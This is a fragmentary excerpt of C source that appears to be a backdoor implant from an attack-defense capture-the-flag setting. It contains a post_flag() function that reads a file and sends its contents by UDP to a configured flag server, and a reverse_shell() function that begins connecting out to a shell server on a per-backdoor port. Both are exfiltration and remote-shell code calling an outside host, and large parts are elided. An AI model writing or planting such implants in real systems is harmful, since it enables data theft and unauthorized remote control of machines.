...
#define IP_STR2INT(a,b,c,d) ((a)|(b<<8)|(c<<16)|(d<<24))
...
void post_flag()
{
    ...
    addr.sin_family = 2;
    addr.sin_port = HTONS(FLAG_SERVER_PORT);
    addr.sin_addr = FLAG_SERVER_IP;
    ...
    msg[0] = BKDOOR_NUM + '0';
    msg[1] = '@';
    int len = read(fd, msg+2, sizeof(msg)-2);
    close(fd);
    sendto(sock, msg, len+2, 0, &addr, sizeof(addr));
#else
...
void reverse_shell()
{
    ...
    addr.sin_family = 2;
#if defined(BKDOOR_NUM)
    addr.sin_port = HTONS(SHELL_SERVER_PORT + BKDOOR_NUM);
#else
    addr.sin_port = HTONS(SHELL_SERVER_PORT);
#endif
    addr.sin_addr = SHELL_SERVER_IP;
